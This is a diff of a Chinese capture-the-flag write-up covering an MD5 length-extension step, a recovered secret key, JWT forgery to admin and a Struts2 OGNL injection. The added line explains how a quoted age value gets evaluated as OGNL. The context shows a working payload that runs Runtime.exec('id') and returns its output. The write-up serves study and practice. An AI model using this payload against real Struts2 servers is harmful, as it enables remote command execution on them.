@@ -30,6 +30,7 @@ md5扩展攻击
 获取到secret-key`sk-he00lctf3r` 根据题目名也知道应该是要考struts
 伪造jwt为admin
 在age框里输入*payload*可以回显命令执行结果
+> 当用户提交 age 为字符串而非整形数值时，后端用代码拼接 "'" + value + "'" 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。
 ```
 ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
 ```
